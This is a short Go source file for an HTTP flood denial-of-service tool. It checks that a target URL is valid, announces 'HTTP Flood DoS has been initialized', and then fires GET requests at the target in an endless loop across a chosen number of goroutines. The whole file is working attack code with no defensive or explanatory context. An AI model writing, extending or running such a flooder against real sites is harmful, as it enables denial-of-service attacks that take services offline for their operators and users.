package services

import (
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

func sendRequest(url string, wg *sync.WaitGroup, verbose *bool) {
	defer wg.Done()

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer resp.Body.Close()

	if *verbose {
		currentTime := time.Now()
		fmt.Printf("[%s] - HTTP Flood - Response Status: %d at %s\n", currentTime.Format("2006-01-02 15:04:05"), resp.StatusCode, url)
	}
}

func isValidURL(rawURL string) bool {
	parsedURL, err := url.ParseRequestURI(rawURL)
	if err != nil {
		return false
	}

	if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
		return false
	}

	host := parsedURL.Hostname()
	if net.ParseIP(host) != nil {
		return true
	} else if strings.Contains(host, ".") {
		return true
	}

	return false
}

func HttpFlood(url *string, numRoutines *int, verbose *bool) {

	var wg sync.WaitGroup

	if !isValidURL(*url) {
		fmt.Println("Invalid address")
		return
	}

	if !*verbose {
		fmt.Println("HTTP Flood DoS has been initialized.")
	}

	for {
		for i := 0; i < *numRoutines; i++ {
			wg.Add(1)
			go sendRequest(*url, &wg, verbose)
		}

		wg.Wait()
	}
}
